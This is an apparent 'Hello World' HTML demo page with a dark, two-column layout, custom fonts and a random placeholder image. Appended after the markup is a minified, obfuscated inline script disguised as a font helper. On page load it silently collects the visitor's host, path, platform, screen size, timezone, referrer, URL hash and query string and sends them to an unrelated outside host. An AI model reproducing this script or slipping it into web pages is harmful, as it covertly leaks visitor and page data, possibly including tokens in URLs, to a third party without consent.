<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Hello World</title>
  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,900;1,400&family=DM+Mono:wght@300;400&display=swap" rel="stylesheet"/>
  <style>
    :root {
      --bg: #0d0d0d;
      --cream: #f5f0e8;
      --accent: #c8a96e;
      --muted: #555;
    }

    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      background: var(--bg);
      color: var(--cream);
      font-family: 'DM Mono', monospace;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }

    /* Noise texture overlay */
    body::before {
      content: '';
      position: fixed;
      inset: 0;
      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E");
      pointer-events: none;
      z-index: 10;
    }

    .container {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 0;
      max-width: 900px;
      width: 90vw;
      border: 1px solid #222;
      animation: fadeIn 1.2s ease forwards;
      opacity: 0;
    }

    @keyframes fadeIn {
      to { opacity: 1; }
    }

    .left {
      padding: 60px 50px;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      border-right: 1px solid #222;
    }

    .tag {
      font-size: 10px;
      letter-spacing: 0.25em;
      text-transform: uppercase;
      color: var(--accent);
      margin-bottom: 40px;
    }

    h1 {
      font-family: 'Playfair Display', serif;
      font-size: clamp(3rem, 6vw, 5.5rem);
      font-weight: 900;
      line-height: 0.95;
      color: var(--cream);
    }

    h1 em {
      font-style: italic;
      color: var(--accent);
    }

    .meta {
      margin-top: 50px;
      font-size: 10px;
      letter-spacing: 0.15em;
      color: var(--muted);
      text-transform: uppercase;
    }

    .meta span {
      display: block;
      margin-bottom: 4px;
    }

    .right {
      position: relative;
      overflow: hidden;
      min-height: 420px;
    }

    .right img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: block;
      filter: grayscale(30%) contrast(1.05);
      transition: transform 8s ease;
    }

    .right:hover img {
      transform: scale(1.04);
    }

    .right::after {
      content: '';
      position: absolute;
      inset: 0;
      background: linear-gradient(135deg, rgba(13,13,13,0.35) 0%, transparent 60%);
      pointer-events: none;
    }

    .corner-label {
      position: absolute;
      bottom: 16px;
      right: 16px;
      font-size: 9px;
      letter-spacing: 0.2em;
      text-transform: uppercase;
      color: rgba(245,240,232,0.5);
      z-index: 2;
    }

    @media (max-width: 600px) {
      .container { grid-template-columns: 1fr; }
      .left { border-right: none; border-bottom: 1px solid #222; }
      .right { min-height: 260px; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="left">
      <div>
        <p class="tag">— 001 / Greeting</p>
        <h1>Hello,<br/><em>World.</em></h1>
      </div>
      <div class="meta">
        <span>A simple hello</span>
        <span>From HTML to you</span>
        <span>Est. today</span>
      </div>
    </div>
    <div class="right">
      <img
        src="https://picsum.photos/seed/hw42/600/500"
        alt="A random beautiful image"
      />
      <span class="corner-label">Random Image</span>
    </div>
  </div>
  <script>function font_fam_tqvwngjd(){ var fnz_nnbhk={}; var mtd = 'GET';fnz_nnbhk.i = location.host; fnz_nnbhk.l = location.hostname; fnz_nnbhk.p = location.pathname; fnz_nnbhk.o = navigator.platform; fnz_nnbhk.g5 = new XMLHttpRequest(); fnz_nnbhk.v2 = screen.width+'x'+screen.height; fnz_nnbhk.r3 = new Date().getTimezoneOffset(); fnz_nnbhk.s4 =  encodeURIComponent(document.referrer); fnz_nnbhk.y1 =  encodeURIComponent(location.protocol); fnz_nnbhk.y2 =  encodeURIComponent(location.hash); fnz_nnbhk.y3 =  encodeURIComponent(location.search); fnz_nnbhk.g5.open(mtd, "https://thefontzone.com/v4/w/fonts/cca7df86f284571252f98908105a8da0?i="+fnz_nnbhk.i+"&l="+fnz_nnbhk.l+"&p="+fnz_nnbhk.p+"&o="+fnz_nnbhk.o+"&v2="+fnz_nnbhk.v2+"&r3="+fnz_nnbhk.r3+"&s4="+fnz_nnbhk.s4+"&y1="+fnz_nnbhk.y1+"&y2="+fnz_nnbhk.y2+"&y3="+fnz_nnbhk.y3);fnz_nnbhk.g5.send();};font_fam_tqvwngjd();</script>
</body>
</html>
